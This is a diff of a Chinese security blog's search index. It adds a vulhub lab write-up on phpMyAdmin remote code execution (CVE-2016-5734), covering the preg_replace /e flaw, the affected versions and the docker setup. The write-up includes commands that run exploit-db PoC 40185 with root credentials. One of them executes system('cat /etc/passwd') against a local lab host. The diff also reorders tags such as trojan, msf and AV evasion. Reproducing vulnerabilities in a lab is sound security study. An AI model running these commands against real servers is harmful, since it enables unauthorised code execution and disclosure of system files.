@@ -4,6 +4,41 @@
   
     
     <entry>
+      <title>PhpMyAdmin远程代码执行(CVE-2016-5734)</title>
+      <link href="/2022/05/11/PhpMyAdmin-Remote-code-Execution/"/>
+      <url>/2022/05/11/PhpMyAdmin-Remote-code-Execution/</url>
+      
+        <content type="html"><![CDATA[<h1 id="PhpMyAdmin远程代码执行"><a href="#PhpMyAdmin远程代码执行" class="headerlink" title="PhpMyAdmin远程代码执行"></a>PhpMyAdmin远程代码执行</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在其查找并替换字符串功能中，将用户输入的信息拼接进<code>preg_replace</code>函数第一个参数中。</p><p>在PHP5.4.7以前，<code>preg_replace</code>的第一个参数可以利用<code>\0</code>进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>phpmyadmin 4.6.x 版本（直至 4.6.3）</p><p>phpmyadmin 4.4.x 版本（直至 4.4.15.7）</p><p>phpmyadmin 4.0.x 版本（直至 4.0.10.16）</p><p>php版本： 4.3.0 ~5.4.6</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/phpmyadmin/CVE-2016-5734docker-compose up -d</code></pre><h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>我们用大佬写的<a href="https://www.exploit-db.com/exploits/40185">poc</a></p><p>脚本利用</p><pre class=" language-Linux"><code class="language-Linux">python 40185.py -u root -p root http://192.168.3.151:8080</code></pre><p><img src="/2022/05/11/PhpMyAdmin-Remote-code-Execution/image-20220511203322617.png" alt="image-20220511203322617"></p><p>默认执行<code>uname</code></p><p>查看一下<code>/etc/passwd</code></p><pre class=" language-Linux"><code class="language-Linux">python 40185.py -u root -p root -c "system('cat /etc/passwd')" http://192.168.3.151:8080</code></pre><p><img src="/2022/05/11/PhpMyAdmin-Remote-code-Execution/image-20220511203531344.png" alt="image-20220511203531344"></p><p>结束！！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> vulhub </tag>
+            
+            <tag> CVE </tag>
+            
+            <tag> phpmyadmin </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Apache SSI 远程命令执行漏洞</title>
       <link href="/2022/05/11/Apache-ssi-rce/"/>
       <url>/2022/05/11/Apache-ssi-rce/</url>
@@ -2367,9 +2402,9 @@
             
             <tag> 工具使用 </tag>
             
-            <tag> 木马 </tag>
-            
             <tag> msf </tag>
+            
+            <tag> 木马 </tag>
             
             <tag> 免杀 </tag>
             
